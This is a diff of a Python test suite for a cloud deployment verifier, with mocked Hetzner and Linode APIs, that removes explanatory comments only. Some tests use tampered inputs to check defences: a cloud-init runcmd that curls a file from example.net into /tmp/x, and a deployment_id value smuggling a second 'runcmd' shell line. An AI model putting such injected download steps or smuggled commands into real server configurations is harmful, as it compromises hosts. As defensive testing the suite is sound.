@@ -115,7 +115,7 @@ class Hetzner(World):
             self.actions_of["firewall"].append(self.action(9, "set_firewall_rules", "2026-10-30T12:00:00+00:00"))
             return Response(201, {"actions": [self.actions_of["firewall"][-1]]})
         if path == "/servers" and method == "POST":
-            assert self.rules_action["status"] == "success"  # the firewall is attached only when it is ready
+            assert self.rules_action["status"] == "success"
             self.user_data, self.body = body["user_data"], body
             self.server = {"id": 42, "name": body["name"], "created": CREATED, "labels": body["labels"],
                            "image": {"name": body["image"]}, "server_type": {"name": body["server_type"]},
@@ -134,7 +134,7 @@ class Hetzner(World):
             return Response(404, {"error": {"code": "not_found"}}) if self.deleted else Response(200, {"server": self.server})
         if path in ("/servers/42/actions", "/firewalls/77/actions"):
             items = self.actions_of["server" if path.startswith("/servers") else "firewall"]
-            page = params["page"]  # one action per page exercises pagination
+            page = params["page"]
             return Response(200, {"actions": items[page - 1:page],
                                   "meta": {"pagination": {"next_page": page + 1 if page < len(items) else None}}})
         raise AssertionError(method + " " + path)
@@ -239,7 +239,7 @@ class Linode(World):
                            "ipv4": [self.ipv4, "192.168.1.5"], "ipv6": "2001:db8:3::5/128", "backups": {"enabled": False}}
             self.event(2, "linode_create", "linode", self.server_id)
             self.event(3, "linode_config_create", "linode", self.server_id)
-            return Response(200, dict(self.linode))  # firewall_id ignored: Linode interfaces need a device
+            return Response(200, dict(self.linode))
         if path == "/linode/instances/6001/firewalls":
             return Response(200, {"data": [self.firewall] if self.attached else [], "page": 1, "pages": 1})
         if path == "/networking/firewalls/501/devices":
@@ -564,7 +564,7 @@ def real_reference():
 
 @pytest.fixture(autouse=True)
 def reference_in_process(request, monkeypatch):
-    # A new interpreter importing requests takes seconds here; one test below runs the real one.
+
     if "real_reference" not in request.fixturenames:
         original = cloud.reference_installer
         monkeypatch.setattr(cloud, "reference_installer", lambda record, source: original(record, source, run=build_here))
@@ -717,7 +717,7 @@ def test_host_evidence_mismatches_fail(setup):
     tampered.write_bytes((out / "cloud-init.redacted.yaml").read_bytes().replace(b"passwd -l root", b"true"))
     assert checks(run_verify(world, host, out, cloud_init=tampered))["cloud_init"] == "fail"
     assert checks(run_verify(world, host, out, fingerprint="0" * 64))["fingerprint"] == "fail"
-    host.override = {"instance_id": 99}  # the key answers from another server
+    host.override = {"instance_id": 99}
     assert checks(run_verify(world, host, out))["binding"] == "fail"
 
 
@@ -726,8 +726,8 @@ def test_bootstrap_measurements_are_explicitly_self_reported(setup):
     original = world.user_data
     world.user_data += "\n# Synthetic unexpected bootstrap change\n"
     assert checks(run_verify(world, host, out))["binding"] == "fail"
-    # Model a compromised collector reporting the original values, its user data included. Provider APIs
-    # remain honest; there is no independent measurement of the runtime here.
+
+
     host.override = {**assurance.user_data_hashes(original), "user_data_redacted": assurance.redact_user_data(original)}
     report = run_verify(world, host, out)
     assert report["result"] == "pass", [c for c in report["checks"] if c["status"] != "pass"]
@@ -829,7 +829,7 @@ def test_reference_installer_is_built_by_the_checkouts_own_code(tmp_path, monkey
     record = {**spec, "tunnel": {"id": TUNNEL}}
     built = cloud.reference_installer(record, ROOT)
     assert built == assurance.redact_user_data(cloud.cloud_init(spec, TUNNEL, "p" * 43, "eyJhIjoi" + "c" * 60))
-    with pytest.raises(cloud.DeployError, match="reference installer"):  # not a checkout of TgWitness
+    with pytest.raises(cloud.DeployError, match="reference installer"):
         cloud.reference_installer(record, tmp_path)
 
 
@@ -839,24 +839,24 @@ def test_installer_must_equal_the_reference_byte_for_byte(setup):
     report = run_verify(world, host, out)
     assert checks(report)["cloud_init"] == "pass" and "byte for byte equal" in detail(report, "cloud_init")
     assert "the user data the server read from its metadata service" in detail(report, "cloud_init")
-    # The old check passed anything that named the commit and masked SSH.
+
     added = out / "added.yaml"
     added.write_bytes(published.replace(b"runcmd:", b"runcmd:\n  - [curl, -o, /tmp/x, https://example.net/x]"))
     report = run_verify(world, host, out, cloud_init=added)
     assert checks(report)["cloud_init"] == "fail" and "published installer differs" in detail(report, "cloud_init")
-    # The server reports user data its hash agrees with, but not the installer the commit builds.
+
     host.override = {"user_data_redacted": published.decode() + "# extra\n",
                      "user_data_redacted_sha256": assurance.user_data_hashes(published.decode() + "# extra\n")["user_data_sha256"]}
     report = run_verify(world, host, out, cloud_init=None)
     assert checks(report)["cloud_init"] == "fail" and 'unexpected "# extra\\n"' in detail(report, "cloud_init")
-    host.override = {"user_data_redacted": published.decode() + "# extra\n"}  # text and hash disagree
+    host.override = {"user_data_redacted": published.decode() + "# extra\n"}
     assert "its own SHA-256" in detail(run_verify(world, host, out), "binding")
-    host.override = {"user_data_redacted": None}  # a collector that reports only the hash
+    host.override = {"user_data_redacted": None}
     report = run_verify(world, host, out)
     assert checks(report)["cloud_init"] == "pass" and "not the user data itself" in detail(report, "cloud_init")
     host.override = {}
     assert checks(run_verify(world, host, out, source=None))["cloud_init"] == "unavailable"
-    # A record value deploy never writes cannot carry its own lines into the reference.
+
     forged = json.loads((out / "deployment.json").read_text())
     forged["deployment_id"] += "\nruncmd: [[sh, -c, id]]"
     (out / "deployment.json").write_text(json.dumps(forged))
@@ -917,7 +917,7 @@ def test_each_provider_metadata_service_is_read_without_keeping_user_data(key, a
     record = assurance.provider_record(key, request)
     assert "error" not in record and expected.items() <= record.items() and "user_data" not in record
     assert record["user_data_sha256"] == assurance.user_data_hashes("#cloud-config\n")["user_data_sha256"]
-    if key in ("linode", "aws"):  # token first, sent with every later request
+    if key in ("linode", "aws"):
         assert seen[0][1] == "PUT" and all(h and "tok" in h.values() for _, m, h in seen[1:])
 
 
